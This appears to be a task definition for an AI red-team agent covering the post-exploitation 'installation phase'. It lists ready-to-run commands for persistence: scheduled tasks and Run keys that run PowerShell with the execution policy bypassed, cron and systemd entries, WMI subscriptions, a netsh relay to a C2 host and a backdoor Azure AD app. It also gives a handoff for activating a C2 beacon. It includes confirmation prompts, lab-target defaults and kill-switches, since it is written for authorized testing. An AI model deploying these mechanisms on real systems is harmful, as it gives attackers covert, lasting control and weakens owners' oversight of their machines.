<!-- Powered by BMAD(R) Core -->

# Task: installation-phase

## Purpose
- **Deploy and validate** authorized persistence mechanisms to maintain foothold after exploitation.
- Produce `docs/red-team/persistence-report.md` with **live artefacts**, system modifications, and defender-aware telemetry.

## Prerequisites
- `docs/red-team/exploit-report.md` (with **confirmed access**)
- Access to **authorized lab hosts** or approved target scope.
- Directories: `scripts/persistence/`, `reports/persistence/`.

## Success Criteria
- Persistence mechanisms **executed and verified** on live systems.
- **Proof of persistence** captured: registry keys, cron entries, service configs, cloud objects.
- ATT&CK technique coverage documented (T1053, T1547, T1543, T1098).
- **Artefact paths, hashes, and logs** stored in `reports/persistence/`.
- Clear handoff to C2 Agent with **confirmed foothold stability**.

## Safety & Compliance
- **Never deploy persistence without explicit user confirmation per mechanism.**
- Default to **lab-safe targets** (127.0.0.1, lab domains) unless real targets are approved.
- **Log every command, output, and artefact** with UTC timestamps.
- **Immediately remove** persistence if unintended impact occurs; document rollback steps.

## Recommended Tooling
| Tool | Command | Goal | Expected Output |
| --- | --- | --- | --- |
| schtasks | `schtasks /Create /RU SYSTEM /SC ONLOGON /TN "Updater" /TR "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\updater.ps1"` | **Deploy** Windows scheduled task persistence. | Success message + task verification log. |
| reg add | `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File %APPDATA%\\updater.ps1" /f` | **Deploy** Run key persistence. | Registry confirmation + `reg query` verification. |
| netsh portproxy | `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress={{c2_host}}` | **Establish** TCP relay for C2. | Portproxy confirmation + `netsh interface portproxy show all` output. |
| systemd service | `sudo tee /etc/systemd/system/rt-sync.service <<'EOF' ... EOF` | **Deploy** Linux systemd service. | File creation + `systemctl status rt-sync` output. |
| crontab | `(crontab -l 2>/dev/null; echo "*/30 * * * * /usr/bin/python3 /opt/rt/sync.py >> /var/log/rt-sync.log 2>&1") | crontab -` | **Deploy** cron-based persistence. | Crontab list showing new entry. |
| wmiexec | `wmic /namespace:\\root\\subscription PATH __EventFilter CREATE Name='RTLogon' ...` | **Deploy** WMI event subscription. | WMI object creation + `Get-WmiObject` verification. |
| az cli | `az ad app create --display-name "Contoso Sync Agent" --credential-description "RedTeamSim"` | **Deploy** Azure AD application. | JSON response with appId + `az ad app show` verification. |

> ⚠️ **All tools require explicit user confirmation before execution.**

## Procedure
1. Review `exploit-report.md` to identify **confirmed access** (e.g., `www-data@127.0.0.1`, `admin@ubuntu-lab`).
2. Define persistence requirements: dwell-time, resilience, stealth, kill-switch conditions.
3. For each candidate technique:
   - **Prompt user**: “Deploy [technique] on [target]? (y/N)”
   - **If confirmed**, execute command, capture full output, store in `reports/persistence/{{technique}}-{{timestamp}}.log`
4. **Validate persistence**:
   - Windows: `schtasks /Query /TN "Updater"`, `reg query HKCU\...\Run`
   - Linux: `systemctl status rt-sync`, `crontab -l`
   - Cloud: `az ad app list --display-name "Contoso Sync Agent"`
5. Document each mechanism including:
   - **Execution command and output**
   - **Artefact path** (e.g., `/etc/systemd/system/rt-sync.service`)
   - **Verification output** (e.g., `Active: active (running)`)
   - **Detection signals** (e.g., “Sysmon Event 4698: Scheduled Task Created”)
   - **Kill-switch**: `schtasks /Delete /TN "Updater"`, `sudo systemctl disable --now rt-sync`
6. Assess risk: if detection likelihood is too high, recommend alternatives or abort.
7. Populate `docs/red-team/persistence-report.md` via template with:
   - **Real artefact paths**
   - **UTC timestamps**
   - **SHA256 hashes** (for script files)
8. Store persistence scripts in `scripts/persistence/` with headers noting **execution status**.
9. Prepare handoff brief for C2 Agent:
   > “Persistence confirmed on 127.0.0.1 via systemd service `rt-sync`.  
   > Service active and resilient to reboot.  
   > Next: activate C2 beacon.”

## Decision Gates
- **User Confirmation**: **Never auto-deploy** — require “y” per mechanism.
- **Privilege Validation**: if command fails due to permissions, log error and suggest escalation.
- **Impact Check**: if system instability occurs, immediately trigger kill-switch.
- **Detection Alert**: if local EDR/SIEM triggers, log event and consider pausing.

## Outputs
- `docs/red-team/persistence-report.md` (**with live persistence evidence**)
- **Real logs and artefacts** in `reports/persistence/`
- **Persistence scripts** in `scripts/persistence/`
- Handoff summary for C2 phase with **confirmed foothold status**